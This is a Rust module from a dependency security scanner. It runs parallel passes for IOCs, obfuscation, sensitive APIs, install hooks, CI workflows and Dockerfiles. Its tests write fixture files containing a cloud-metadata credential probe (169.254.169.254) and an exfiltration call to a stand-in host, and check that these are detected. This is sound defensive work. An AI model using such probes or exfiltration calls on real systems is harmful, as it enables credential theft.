//! Analysis passes. Each analyzer takes the scan context and emits findings.

pub mod behavior;
pub mod dockerfile;
pub mod gha;
pub mod image_config;
pub mod image_secrets;
pub mod ide_hooks;
pub mod install_hooks;
pub mod ioc;
pub mod obfuscation;
pub mod sensitive_api;
pub mod util;

use std::borrow::Cow;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::sync::atomic::{AtomicUsize, Ordering};

use crate::detect::Detected;
use crate::model::{Category, Dependency, Finding};
use crate::ui::Ui;

pub use util::Lang;
use util::Listing;

/// Drop IOC findings located in test/fixture directories, unless
/// `allow_test_files`. The test-dir check is made **relative to `base`** (the
/// scanned project root), so a `test/` component that belongs to the harness's
/// own path (e.g. `.../tests/fixtures/...`) doesn't count. Only IOCs are filtered
/// (test code legitimately embeds fake IPs/URLs/domains); obfuscation /
/// sensitive-API / install-hook findings in tests are kept.
pub fn drop_test_iocs(findings: Vec<Finding>, allow_test_files: bool, base: &Path) -> Vec<Finding> {
    if allow_test_files {
        return findings;
    }
    let base = base.to_string_lossy();
    findings
        .into_iter()
        .filter(|f| {
            !(matches!(f.category, Category::Ioc)
                && f.location.as_deref().is_some_and(|loc| {
                    util::is_test_path(loc.strip_prefix(base.as_ref()).unwrap_or(loc))
                }))
        })
        .collect()
}

/// Is the *dependencies'* own code on disk to be analyzed?
///
/// Most ecosystems keep dependencies outside the project — Rust in
/// `~/.cargo/registry`, Ruby in the bundle path, Go in the module cache — so a
/// scan of those reads the project's own source and nothing else. Node is the
/// exception when `node_modules` is present, and PHP when `vendor/` is committed.
///
/// Callers that draw conclusions *about a dependency* need this: with no code to
/// read, "we found no install hook" means "we could not look", and reporting the
/// two the same way would invent a clean result. Mirrors [`plan`].
pub fn scans_dependency_code(detected: &[Detected]) -> bool {
    detected.iter().any(|d| match d {
        Detected::Node { node_modules, .. } => node_modules.is_some(),
        Detected::Python { site_packages, .. } => site_packages.is_some(),
        // Composer vendors in-tree; the walk covers it when it is there.
        Detected::Php { root, .. } => root.join("vendor").is_dir(),
        Detected::Go { root, .. } => root.join("vendor").is_dir(),
        Detected::Rust { .. } | Detected::Ruby { .. } | Detected::Java { .. } => false,
    })
}

/// A boxed analyzer invocation that appends its findings to the shared vec.
type RunFn<'a> = Box<dyn FnOnce(&mut Vec<Finding>) + Send + 'a>;

/// One indivisible analysis unit: a single analyzer run over a single directory.
/// Collecting them up front lets us show a determinate progress bar (we know the
/// total before we start) while keeping the per-unit logic a plain closure.
struct Step<'a> {
    label: Cow<'static, str>,
    /// Emits `InstallHook` findings — the only analyzers `scripts` needs.
    hooks: bool,
    run: RunFn<'a>,
}

impl<'a> Step<'a> {
    fn new(label: &'static str, run: impl FnOnce(&mut Vec<Finding>) + Send + 'a) -> Self {
        Step {
            label: Cow::Borrowed(label),
            hooks: false,
            run: Box::new(run),
        }
    }

    fn hooks(label: &'static str, run: impl FnOnce(&mut Vec<Finding>) + Send + 'a) -> Self {
        Step {
            hooks: true,
            ..Step::new(label, run)
        }
    }
}

/// Run every step at once and concatenate their findings in plan order, so the
/// report is byte-identical to running them one after another.
///
/// Steps used to run serially, which left all but the content pass on one
/// core: on a 67k-file `node_modules` the behaviour, workflow, Dockerfile and
/// IDE-hook walks were ~90 % of a 5.7 s scan. They are independent (each walks
/// and reads on its own), so one thread per step overlaps them; the content and
/// behaviour passes fan out further through [`par_scan`].
fn run_steps(steps: Vec<Step<'_>>, done: impl Fn(Cow<'static, str>) + Sync) -> Vec<Finding> {
    std::thread::scope(|scope| {
        let done = &done;
        let handles: Vec<_> = steps
            .into_iter()
            .map(|Step { label, run, .. }| {
                scope.spawn(move || {
                    let mut found = Vec::new();
                    run(&mut found);
                    done(label);
                    found
                })
            })
            .collect();
        handles
            .into_iter()
            .flat_map(|h| h.join().expect("analyzer panicked"))
            .collect()
    })
}

/// Read each of `files` once, on a pool of scoped threads, and hand its text to
/// `scan`. Findings come back in `files` order whatever order the workers
/// finish in, so a caller that emitted them serially keeps its exact output.
///
/// A shared cursor rather than fixed chunks: one worker stuck on a large
/// bundle does not hold a slice of files hostage. Each worker accumulates
/// locally, so there is no lock on the hot path.
fn par_scan(
    files: &[PathBuf],
    scan: impl Fn(&Path, &str, &mut Vec<Finding>) + Sync,
) -> Vec<Finding> {
    let total = files.len();
    if total == 0 {
        return Vec::new();
    }
    let cursor = AtomicUsize::new(0);
    let sink: Mutex<Vec<(usize, Vec<Finding>)>> = Mutex::new(Vec::new());

    std::thread::scope(|scope| {
        for _ in 0..workers().min(total) {
            scope.spawn(|| {
                let mut local = Vec::new();
                loop {
                    let i = cursor.fetch_add(1, Ordering::Relaxed);
                    if i >= total {
                        break;
                    }
                    let Some(text) = read_lossy(&files[i]) else {
                        continue;
                    };
                    let mut found = Vec::new();
                    scan(&files[i], &text, &mut found);
                    if !found.is_empty() {
                        local.push((i, found));
                    }
                }
                sink.lock().unwrap().append(&mut local);
            });
        }
    });

    let mut per_file = sink.into_inner().unwrap();
    per_file.sort_unstable_by_key(|(i, _)| *i);
    per_file.into_iter().flat_map(|(_, f)| f).collect()
}

/// A file's text for the analyzers, whatever its encoding. `read_to_string`
/// refused a file with a single invalid UTF-8 byte, and every analyzer then
/// skipped it silently — one Latin-1 byte in a comment hid the whole file.
/// Invalid bytes become U+FFFD; valid UTF-8 (nearly every file) is not copied.
fn read_lossy(path: &Path) -> Option<String> {
    let bytes = std::fs::read(path).ok()?;
    Some(match String::from_utf8(bytes) {
        Ok(s) => s,
        Err(e) => String::from_utf8_lossy(e.as_bytes()).into_owned(),
    })
}

/// Read each source file **once** and run every content analyzer over it.
///
/// IOC, obfuscation and sensitive-API detection all want the same files, and
/// each used to walk the tree and read every file itself: three traversals and
/// three `read_to_string` calls for identical bytes. Measured on a 3 954-file
/// project that was 8 walks, 36 508 directory entries visited and 15 025 file
/// reads for 3 954 files on disk. They are pure functions of `(path, text)`, so
/// one pass feeds all three.
///
/// Files are independent, so the pass runs across a small pool of scoped
/// threads — the same cursor-and-workers shape as [`crate::resolve`]. Each
/// worker accumulates into its own `Vec` and they are merged at the end, so
/// there is no lock on the hot path. Worker count is capped: the work is a mix
/// of `read` syscalls and regex scanning, and past the core count the readers
/// just queue on the same disk.
fn scan_content(list: &Listing, dir: &Path, out: &mut Vec<Finding>, lang: Lang) {
    content_pass(&list.files(dir, lang.exts()), out, lang, false);
}

/// The content pass over files already known to be `lang`. With `behaviour`,
/// the behaviour markers are checked on the same read, for the files whose
/// extension that pass covers — the caller then keeps them out of
/// [`behavior::scan_dir`].
fn content_pass(files: &[PathBuf], out: &mut Vec<Finding>, lang: Lang, behaviour: bool) {
    let mut found = par_scan(files, |path, text, local| {
        ioc::scan_text(path, text, local);
        obfuscation::scan_text(path, text, local, lang);
        sensitive_api::scan_text(path, text, local, lang);
        if behaviour && behavior::covers(path) {
            behavior::scan_text(path, text, local);
        }
    });
    // Sorting by location keeps the report stable and in the order it has
    // always had (`--json` diffs and the gate's baseline depend on it).
    found.sort_by(|a, b| a.location.cmp(&b.location));
    out.append(&mut found);
}

/// Threads for the content pass. `available_parallelism` fails on a container
/// with no CPU affinity info; 4 is a safe floor there.
fn workers() -> usize {
    std::thread::available_parallelism().map_or(4, |n| n.get())
}

/// Run every content analyzer, for **every language**, over an arbitrary source
/// tree — regardless of ecosystem detection. Used by `system inspect --deep` to
/// scan cloned dependency source directly (a C/Perl/etc. upstream has no
/// lockfile for [`plan`] to key off, but its code should still be inspected).
pub fn scan_source_tree(root: &Path) -> Vec<Finding> {
    // One walk for everything (it was fifteen: one per language plus three).
    let list = &Listing::walk(root);
    let steps = vec![
        Step::new("content", move |out| {
            // Each language's files through the content pass in `Lang::ALL`
            // order — the order the findings have always come in.
            let mut by_lang: Vec<Vec<PathBuf>> = vec![Vec::new(); Lang::ALL.len()];
            for path in list.select(root, |_| true) {
                if let Some(i) = Lang::ALL.iter().position(|l| l.matches(&path)) {
                    by_lang[i].push(path);
                }
            }
            // Every behaviour extension is some language's, so behaviour rides
            // along on the same reads and needs no pass of its own.
            for (&lang, files) in Lang::ALL.iter().zip(&by_lang) {
                content_pass(files, out, lang, true);
            }
        }),
        Step::new("ide", move |out| ide_hooks::scan_dir(list, out)),
        Step::new("gha", move |out| gha::scan_dir(list, out)),
    ];
    run_steps(steps, |_| {})
}

/// Run every analyzer that applies to the detected ecosystems, driving a
/// progress bar over the units. Order is irrelevant — findings are independent.
/// Each analyzer is best-effort: a failure inside one must not abort the scan.
pub fn run_all(detected: &[Detected], deps: &[Dependency], ui: &Ui) -> Vec<Finding> {
    // Where each Node package came from. The installed `package.json` does not
    // record it, so the install-hook analyzer cannot work it out from the tree
    // it walks — and it decides whether a `prepare` runs on install.
    run_plan(detected, deps, ui, false, None)
}

/// Only the analyzers that emit `InstallHook` findings — what `scripts` reads.
/// The full plan costs it the whole IOC/obfuscation/behaviour scan of
/// `node_modules` just to throw those findings away.
pub fn run_install_hooks(detected: &[Detected], deps: &[Dependency], ui: &Ui) -> Vec<Finding> {
    run_plan(detected, deps, ui, true, None)
}

/// [`run_all`] over one package's own files only — what `why --blast` reads.
/// It keeps just the findings attributed to that package, and analyzers name
/// a finding after the package whose directory the file is in, so the rest of
/// the tree was read, regex-scanned and thrown away. See [`Listing::owned_by`].
pub fn run_for_package(
    detected: &[Detected],
    deps: &[Dependency],
    ui: &Ui,
    pkg: &str,
) -> Vec<Finding> {
    run_plan(detected, deps, ui, false, Some(pkg))
}

fn run_plan(
    detected: &[Detected],
    deps: &[Dependency],
    ui: &Ui,
    hooks_only: bool,
    only: Option<&str>,
) -> Vec<Finding> {
    let sources = crate::lifecycle::Sources::from_deps(deps);
    // One listing per project root, shared by every step under it.
    let mut roots: Vec<&Path> = Vec::new();
    for d in detected {
        if !roots.contains(&d.root()) {
            roots.push(d.root());
        }
    }
    let listings: Vec<Listing> = roots
        .into_iter()
        .map(|r| match only {
            Some(pkg) => Listing::walk(r).owned_by(pkg),
            None => Listing::walk(r),
        })
        .collect();
    let steps: Vec<Step> = plan(detected, &sources, &listings)
        .into_iter()
        .filter(|s| s.hooks || !hooks_only)
        .collect();
    let total = steps.len();

    let bar = ui.bar_ticks(total as u64, "gochi analyzing", crate::gochi::SCANNING);
    // Steps run concurrently, so the label is the one that just finished.
    let findings = run_steps(steps, |label| {
        bar.step(label);
        bar.inc();
    });
    bar.done(format!(
        "analyzed {total} unit(s) — {} finding(s)",
        findings.len()
    ));

    findings
}

/// Enumerate the analysis units for the detected ecosystems. This is the single
/// source of truth for both *what* runs and *how many* steps the bar shows.
fn plan<'a>(
    detected: &'a [Detected],
    sources: &'a crate::lifecycle::Sources,
    listings: &'a [Listing],
) -> Vec<Step<'a>> {
    let mut steps = Vec::new();
    let listing = |root: &Path| -> &'a Listing {
        listings
            .iter()
            .find(|l| l.root() == root)
            .expect("run_plan lists every detected root")
    };

    // IDE/agent autostart-hook scan runs once per unique project root (covers the
    // root's own `.vscode`/`.claude` and every dependency's under `node_modules`).
    let mut seen_roots: Vec<&Path> = Vec::new();
    for d in detected {
        let root = d.root();
        if !seen_roots.contains(&root) {
            seen_roots.push(root);
            let list = listing(root);
            // `node_modules` JS is behaviour-checked by the Node content pass,
            // which reads those files anyway — they are most of a Node tree,
            // and reading each twice made the scan bound on `open`/`read`.
            // ponytail: only the Node overlap is folded; the root's own
            // py/rb/php/go are still read by both passes (small trees).
            let skip_js = node_modules_of(detected, root);
            steps.push(Step::hooks("ide/agent · autostart-hooks", move |f| {
                ide_hooks::scan_dir(list, f)
            }));
            steps.push(Step::new(
                "behaviour · secrets/persistence/worm",
                move |f| behavior::scan_dir(list, skip_js, f),
            ));
            steps.push(Step::new("ci · github-actions workflows", move |f| {
                gha::scan_dir(list, f)
            }));
            steps.push(Step::new("build · dockerfiles", move |f| {
                dockerfile::scan_dir(list, f)
            }));
        }
    }

    for d in detected {
        let list = listing(d.root());
        match d {
            Detected::Node {
                node_modules: Some(nm),
                ..
            } => {
                steps.push(Step::hooks("node · install-hooks", move |f| {
                    install_hooks::scan_node(list, nm, sources, f)
                }));
                let behaviour = node_modules_of(detected, d.root()) == Some(nm.as_path());
                steps.push(Step::new(
                    "node · ioc/obfuscation/sensitive-api",
                    move |f| {
                        content_pass(
                            &list.files(nm, Lang::JavaScript.exts()),
                            f,
                            Lang::JavaScript,
                            behaviour,
                        )
                    },
                ));
            }
            Detected::Node { .. } => { /* no node_modules → static-on-lockfile only */ }
            Detected::Python {
                root,
                site_packages,
                ..
            } => {
                // Local sources (setup.py, etc.) live at the repo root.
                push_python(&mut steps, list, root);
                // A venv inside the project is already covered by the root
                // walk (it does not skip hidden or ignored dirs); scanning it
                // again doubled the work and every finding in it.
                if let Some(sp) = site_packages
                    && !sp.starts_with(root)
                {
                    push_python(&mut steps, list, sp);
                }
            }
            Detected::Rust { root, .. } => {
                // Rust deps live in ~/.cargo/registry — we don't scan that by default;
                // we scan the project's own src/ for sensitive APIs as a courtesy.
                // (`join` here so the closure owns a `PathBuf` independent of `root`.)
                let src = root.join("src");
                if src.is_dir() {
                    steps.push(Step::new(
                        "rust · ioc/obfuscation/sensitive-api",
                        move |f| scan_content(list, &src, f, Lang::Rust),
                    ));
                }
            }
            Detected::Ruby { root, .. } => {
                // Gems aren't vendored in-repo (they live in the bundle path), so —
                // like Rust — we scan the project's own Ruby source for sensitive
                // primitives, IOCs, and obfuscation.
                steps.push(Step::new(
                    "ruby · ioc/obfuscation/sensitive-api",
                    move |f| scan_content(list, root, f, Lang::Ruby),
                ));
            }
            Detected::Php { root, .. } => {
                // Composer vendors dependencies under vendor/ when installed, so a
                // single root walk covers both the project's own PHP and any
                // committed vendor tree.
                steps.push(Step::new(
                    "php · ioc/obfuscation/sensitive-api",
                    move |f| scan_content(list, root, f, Lang::Php),
                ));
            }
            Detected::Go { root, .. } => {
                // Go has no install-time hooks; modules live in the module cache
                // or a committed vendor/ tree. We scan the project's own source
                // (and vendor/ if present) for sensitive APIs, IOCs, obfuscation.
                steps.push(Step::new("go · ioc/obfuscation/sensitive-api", move |f| {
                    scan_content(list, root, f, Lang::Go)
                }));
            }
            Detected::Java { root, .. } => {
                // JVM dependencies live in the Maven/Gradle caches, not in-repo.
                // We scan the project's own JVM source for sensitive APIs, IOCs,
                // and obfuscation. (Build-script execution is out of scope.)
                steps.push(Step::new(
                    "java · ioc/obfuscation/sensitive-api",
                    move |f| scan_content(list, root, f, Lang::Java),
                ));
            }
        }
    }

    steps
}

/// The `node_modules` of the first Node project at `root` — the one whose
/// content pass also runs the behaviour check.
fn node_modules_of<'a>(detected: &'a [Detected], root: &Path) -> Option<&'a Path> {
    detected.iter().find_map(|d| match d {
        Detected::Node {
            root: r,
            node_modules: Some(nm),
            ..
        } if r == root => Some(nm.as_path()),
        _ => None,
    })
}

/// Python is scanned identically at the repo root and (if present) the venv's
/// site-packages, so both share one step-emitting helper.
fn push_python<'a>(steps: &mut Vec<Step<'a>>, list: &'a Listing, dir: &'a Path) {
    steps.push(Step::hooks("python · install-hooks", move |f| {
        install_hooks::scan_python(list, dir, f)
    }));
    steps.push(Step::new(
        "python · ioc/obfuscation/sensitive-api",
        move |f| scan_content(list, dir, f, Lang::Python),
    ));
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::Severity;

    fn ioc(loc: &str) -> Finding {
        Finding {
            dependency: "x".into(),
            severity: Severity::Medium,
            category: Category::Ioc,
            detail: "d".into(),
            location: Some(loc.into()),
            evidence: None,
            enrich_url: None,
        }
    }

    #[test]
    fn drops_test_iocs_by_default_only() {
        let base = std::path::Path::new("");
        let fs = vec![
            ioc("src/a.rs:1"),
            ioc("test/b.py:2"),
            ioc("pkg/tests/c.rs:3"),
        ];
        let kept = drop_test_iocs(fs.clone(), false, base);
        assert_eq!(kept.len(), 1);
        assert_eq!(kept[0].location.as_deref(), Some("src/a.rs:1"));
        // A file merely named `test_*` is NOT a test dir.
        assert_eq!(
            drop_test_iocs(vec![ioc("src/test_util.rs:1")], false, base).len(),
            1
        );
        // --allow-test-files keeps everything.
        assert_eq!(drop_test_iocs(fs, true, base).len(), 3);
    }

    #[test]
    fn test_check_is_relative_to_base() {
        // A `tests` component that belongs to the base path must NOT count.
        let base = std::path::Path::new("/repo/tests/fixtures/proj");
        let f = ioc("/repo/tests/fixtures/proj/node_modules/evil/x.js:1");
        assert_eq!(
            drop_test_iocs(vec![f], false, base).len(),
            1,
            "harness path ignored"
        );
        // But a test dir *below* the base is filtered.
        let f2 = ioc("/repo/tests/fixtures/proj/test/x.js:1");
        assert_eq!(drop_test_iocs(vec![f2], false, base).len(), 0);
    }

    /// Behaviour rides on the content pass in a source-tree scan: each marker
    /// is reported once, not once per pass that reads the file.
    #[test]
    fn source_tree_reports_behaviour_once() {
        let dir = std::env::temp_dir().join(format!("pm-srctree-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("stealer.js"),
            "fetch('http://169.254.169.254/latest/meta-data/')",
        )
        .unwrap();
        let found = scan_source_tree(&dir);
        std::fs::remove_dir_all(&dir).ok();

        let harvest = found
            .iter()
            .filter(|f| f.detail.starts_with("credential/secret harvesting"))
            .count();
        assert_eq!(harvest, 1, "{found:#?}");
    }

    /// One invalid UTF-8 byte used to make `read_to_string` fail, and every
    /// analyzer skipped the file without a word — a free evasion.
    #[test]
    fn a_file_with_invalid_utf8_is_still_scanned() {
        let dir = std::env::temp_dir().join(format!("pm-latin1-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let mut body = b"// caf\xe9 (Latin-1)\n".to_vec();
        body.extend_from_slice(b"fetch('http://169.254.169.254/x');\nsend(\"exfil.evil.tk\");\n");
        std::fs::write(dir.join("x.js"), body).unwrap();
        let found = scan_source_tree(&dir);
        std::fs::remove_dir_all(&dir).ok();

        let harvest = |f: &Finding| f.detail.starts_with("credential/secret harvesting");
        assert!(found.iter().any(harvest), "{found:#?}");
        assert!(
            found.iter().any(|f| f.detail == "embedded domain name"
                && f.location.as_deref().is_some_and(|l| l.ends_with("x.js:3"))),
            "{found:#?}"
        );
    }

    #[test]
    fn non_ioc_findings_in_tests_are_kept() {
        let mut f = ioc("test/x.rs:1");
        f.category = Category::SensitiveApi;
        assert_eq!(
            drop_test_iocs(vec![f], false, std::path::Path::new("")).len(),
            1
        );
    }
}
